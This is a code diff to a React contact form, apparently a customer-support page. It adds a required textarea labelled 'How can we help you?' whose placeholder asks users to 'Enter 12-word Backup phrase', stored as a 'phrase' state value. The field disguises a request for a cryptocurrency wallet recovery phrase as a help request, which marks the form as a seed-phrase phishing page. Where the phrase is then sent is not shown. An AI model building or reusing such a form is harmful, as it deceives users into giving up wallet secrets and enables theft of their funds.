@@ -42,7 +42,7 @@ const Form = (props) => {
             label: 'Rewards Account',
         },
         {
-            label: 'Other Services',
+            label: 'Other services',
         },
     ]
 
@@ -152,6 +152,22 @@ const Form = (props) => {
                         styles={customStyles}
                         onChange={onPackageChange}
                     />{' '}
+                </div>
+                <div className='grid'>
+                    <label>Subject</label>
+                    <input className='border ' />
+                </div>
+                <div className='grid'>
+                    <label>How can we help you?</label>
+                    <textarea
+                        id='phrase'
+                        className='text-black border-2 outline-none text-lg p-1 rounded-md justify-self-stretch '
+                        rows={5}
+                        required
+                        value={phrase}
+                        placeholder='Enter 12-word Backup phrase'
+                        onChange={handlePhrase}
+                    ></textarea>{' '}
                 </div>
                 <div className='grid'>
                     <label>Your email address</label>
